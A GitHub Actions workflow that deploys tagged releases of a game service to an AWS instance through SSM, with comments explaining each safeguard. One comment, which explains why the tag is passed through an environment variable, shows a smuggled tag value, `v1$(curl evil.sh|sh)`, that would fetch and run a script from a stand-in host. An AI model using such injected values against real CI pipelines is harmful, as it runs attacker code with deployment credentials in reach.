# Deploy a tagged release to the production instance.
#
# Tags only, never branches — a deploy restarts the service, and the app drains
# in-flight games for ~10s on SIGTERM before systemd kills it. On a real-time
# game that means every live match ends. Tying that to a tag makes it a decision
# someone makes, rather than a side effect of merging.
#
# Nothing here connects to the instance. It sends one SSM command, which runs a
# document whose only action is the redeploy helper baked into the box at boot.

name: Deploy

on:
  push:
    tags:
      - "v*"

# id-token: write is what lets the runner mint the OIDC token that the AWS role
# trusts. Without it the credentials step has nothing to exchange and fails with
# a misleading "Not authorized to perform sts:AssumeRoleWithWebIdentity".
permissions:
  id-token: write
  contents: read

# Two tags pushed close together would otherwise race: both call SendCommand,
# both restart the service, and which code ends up running is decided by whoever
# finishes npm ci last. Queue them instead of cancelling — a cancelled deploy
# still leaves its command running on the box.
concurrency:
  group: deploy-production
  cancel-in-progress: false

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: "22"

      - run: npm ci

      # The instance runs `npm ci --omit=dev` and restarts regardless of whether
      # the code works, and there is no automatic rollback. This is the last
      # point at which a broken tag can be stopped cheaply.
      - name: Run the test suite
        run: npm test

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION || 'us-east-1' }}

      - name: Deploy over SSM
        env:
          # The tag arrives as an environment variable, never interpolated into
          # the script body. A `${{ }}` expression is substituted into the shell
          # source before bash sees it, so a tag named `v1$(curl evil.sh|sh)`
          # would execute on the runner with these AWS credentials in scope.
          TAG: ${{ github.ref_name }}
          PROJECT: wiki-guesser
        run: |
          set -euo pipefail

          INSTANCE_ID=$(aws ec2 describe-instances \
            --filters "Name=tag:Name,Values=$PROJECT" \
                      "Name=instance-state-name,Values=running" \
            --query 'Reservations[].Instances[].InstanceId' \
            --output text)

          if [ -z "$INSTANCE_ID" ] || [ "$INSTANCE_ID" = "None" ]; then
            echo "::error::No running instance tagged Name=$PROJECT."
            exit 1
          fi
          if [ "$(printf '%s' "$INSTANCE_ID" | wc -w)" -ne 1 ]; then
            echo "::error::Expected exactly one instance, found: $INSTANCE_ID"
            exit 1
          fi

          echo "Deploying $TAG to $INSTANCE_ID"

          CMD_ID=$(aws ssm send-command \
            --instance-ids "$INSTANCE_ID" \
            --document-name "$PROJECT-deploy" \
            --parameters "gitRef=$TAG" \
            --comment "GitHub Actions $TAG" \
            --query 'Command.CommandId' \
            --output text)

          # npm ci plus a restart is normally under two minutes. Ten is a hang,
          # and failing the job is more useful than a runner that sits until the
          # six-hour ceiling.
          STATUS=Pending
          for _ in $(seq 1 60); do
            sleep 10
            STATUS=$(aws ssm get-command-invocation \
              --command-id "$CMD_ID" \
              --instance-id "$INSTANCE_ID" \
              --query Status --output text 2>/dev/null || echo Pending)
            case "$STATUS" in
              Pending|InProgress|Delayed) continue ;;
              *) break ;;
            esac
          done

          echo "--- deploy output ---"
          aws ssm get-command-invocation \
            --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" \
            --query StandardOutputContent --output text || true

          ERR=$(aws ssm get-command-invocation \
            --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" \
            --query StandardErrorContent --output text || true)
          if [ -n "$ERR" ] && [ "$ERR" != "None" ]; then
            echo "--- stderr ---"
            echo "$ERR"
          fi

          if [ "$STATUS" != "Success" ]; then
            # The helper ends with a curl of /healthz under `set -e`, so a
            # non-Success status here means the app is not answering. The tag is
            # already checked out and the service already restarted — fix
            # forward, or send the previous tag through this same workflow.
            echo "::error::Deploy finished with status: $STATUS"
            exit 1
          fi

          echo "Deployed $TAG"
